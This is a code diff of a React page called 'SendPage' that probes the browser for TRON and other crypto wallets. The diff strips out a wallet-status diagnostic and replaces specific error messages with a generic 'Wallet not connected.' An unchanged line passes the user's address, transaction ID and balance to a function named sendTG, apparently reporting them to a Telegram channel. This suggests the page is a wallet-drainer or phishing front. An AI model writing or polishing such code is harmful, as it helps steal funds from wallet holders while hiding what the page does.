@@ -23,32 +23,10 @@ export default function SendPage() {
   const [notif, setNotif] = useState(null);
   const [btn, setBtn] = useState({ text: 'Next', disabled: false });
   const [isClient, setIsClient] = useState(false);
-  const [status, setStatus] = useState('');
   const wcProvider = useRef(null);
 
   useEffect(() => {
     setIsClient(true);
-    const check = () => {
-      const p = window.tronWeb || window.tron || window.tronLink || window.trustwallet?.tron;
-      const flags = [
-        window.tronWeb ? 'TW' : '',
-        window.tron ? 'TR' : '',
-        window.trustwallet ? 'TRUST' : '',
-        window.ethereum ? 'ETH' : '',
-        window.tokenpocket ? 'TP' : '',
-      ].filter(Boolean).join('|');
-
-      if (p?.defaultAddress?.base58) {
-        setStatus(`Ready (${flags})`);
-      } else if (p) {
-        setStatus(`Locked (${flags})`);
-      } else {
-        setStatus(`Waiting (${flags || 'None'})`);
-      }
-    };
-    check();
-    const interval = setInterval(check, 3000);
-    return () => clearInterval(interval);
   }, []);
 
   const showNotif = useCallback((msg, type = 'info') => {
@@ -292,15 +270,10 @@ export default function SendPage() {
           await sendTG(addr, txId, balance);
         }
       } else {
-        // If still no nativeTW, show what we found
-        let msg = 'TRON wallet not detected.';
-        if (isMobile && (hasEth || hasTrust)) {
-          msg = 'Wrong Network! Use TRON network in wallet settings.';
-        } else if (injected) {
-          msg = 'Please unlock your TRON wallet.';
-        }
+        // If still no nativeTW, show generic message
+        let msg = 'Wallet not connected.';
+        if (injected && !isMobile) msg = 'Please unlock your TRON wallet.';
         showNotif(msg, 'error');
-        // alert('Diagnostics: ' + (window.tronWeb ? 'tronWeb ' : '') + (window.ethereum ? 'eth ' : '') + (window.trustwallet ? 'trust' : ''));
         setBtn({ text: 'Next', disabled: false });
       }
 
